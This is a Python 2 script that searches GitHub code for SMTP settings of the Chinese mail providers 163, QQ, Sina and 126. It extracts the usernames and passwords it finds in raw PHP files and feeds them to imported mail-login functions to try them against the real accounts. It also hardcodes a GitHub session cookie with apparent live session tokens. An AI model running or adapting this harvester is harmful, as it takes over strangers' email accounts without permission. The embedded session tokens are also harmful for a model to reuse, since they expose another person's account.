# -*- coding: utf-8 -*-
import requests,sys
from bs4 import BeautifulSoup
from Mail_Modules import maillogin_163,maillogin_qq,maillogin_sina,maillogin_126
global urllist
urllist = []


def mailfilter(list,mod):
    usern = ''
    password =''
    for url in list:
        try:
            page = requests.get(url).content

            page = page.split()

            for index in range(len(page)):
                if 'user' in page[index]:
                    usern = page[index+2].strip(',').replace("'","")
                #print user
                if 'pass' in page[index]:
                    password = page[index+2].strip(',').replace("'","")
                #print password
        except:
            pass
        if mod == '163':
            maillogin_163(usern,password,url)
        if mod == 'qq':
            maillogin_qq(usern,password,url)
        if mod == 'sina':
            maillogin_sina(usern,password,url)
        if mod == '126':
            maillogin_126(usern,password,url)

def read_page(keyword,pages):
    print 'Search Keyword : '+keyword
    print 'Scanning '+str(pages)+' pages from Github!'
    for page in range(pages):
        headers = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 115Browser/7.2.5'
        cookie = {"Cookie":"_octo=GH1.1.1911767667.1480641870; logged_in=yes; dotcom_user=menu88; _ga=GA1.2.1291948085.1480641870; tz=Asia%2FShanghai; _gh_sess=eyJzZXNzaW9uX2lkIjoiNWY4YTVkMTk3YzRhNzg3ZWEwYjM5OWUwZWNhNDY2ZWIiLCJjb250ZXh0IjoiLyIsInNweV9yZXBvIjoibWVudTg4L215cHVibGljIiwic3B5X3JlcG9fYXQiOjE0ODEyNDY5NDN9--170066295059ff1fc3d8b46b50d3c62847ac82eb; user_session=JA153nFX9QfOaFbu2vCdVLPuU_9_K9NvEO4mvMqZ4NaK3TjX; __Host-user_session_same_site=JA153nFX9QfOaFbu2vCdVLPuU_9_K9NvEO4mvMqZ4NaK3TjX"}
        url = 'https://github.com/search?l=PHP&p='+str(page)+'&q='+keyword+'&type=Code&utf8=%E2%9C%93'
        page = requests.get(url,cookies = cookie).content
        #print page
        soup = BeautifulSoup(page,"html.parser")
        for link in soup.find_all('a'):
            url = link.get('href')
            if 'blob' in url:
                url = url.split('#')[0]
                url = url.split('blob/')[0]+url.split('blob/')[1]
                urllist.append('https://raw.githubusercontent.com'+url)
pages = sys.argv[1]
read_page('smtp+163.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'163')
urllist =[]
read_page('smtp+qq.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'qq')
urllist =[]
read_page('smtp+sina.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'sina')
urllist =[]
read_page('smtp+126.com',pages)
urllist = list(set(urllist))
mailfilter(urllist,'126')

